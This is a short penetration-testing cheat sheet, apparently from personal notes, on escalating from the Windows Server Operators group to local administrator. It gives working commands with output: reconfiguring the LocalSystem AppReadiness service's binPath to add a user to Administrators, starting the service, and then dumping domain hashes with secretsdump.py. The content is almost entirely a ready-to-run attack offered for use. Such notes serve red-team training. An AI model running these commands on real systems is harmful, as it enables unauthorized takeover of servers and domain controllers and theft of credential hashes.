If find yourself being member of the Server Operators built in group allows to Administer Windows servers without needing assignment of Domain Admin privileges. 
It is a very highly privileged group that can log in locally to servers, including Domain Controllers.
Membership of this group confers the powerful **SeBackupPrivilege** and **SeRestorePrivilege** privileges and the ability to control local services.

## How To Exploit
1)Check that a services starts as System user
```
sc.exe qc "AppReadiness"
[SC] QueryServiceConfig SUCCESS
SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
		
2)Confirm that Server Operators have full access on it
```
c:\Tools\PsService.exe security AppReadiness

                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All
				
```
3)Reconfigure the service to add user to Admins
```
sc.exe config AppReadiness binPath="cmd /c net localgroup Administrators server_adm /add"
[SC] ChangeServiceConfig SUCCESS
```
4)Start the service to execute the payload(If fails to start it's OKAY)
```
sc.exe start AppReadiness
[SC] StartService FAILED 1053:
The service did not respond to the start or control request in a timely fashion.
```
5)Check now if your user is part of Admins
```
net localgroup Administrators
```
6)Profit! Ex dump the Hashes:
```
secretsdump.py USER@IP -just-dc-user Administrator
```
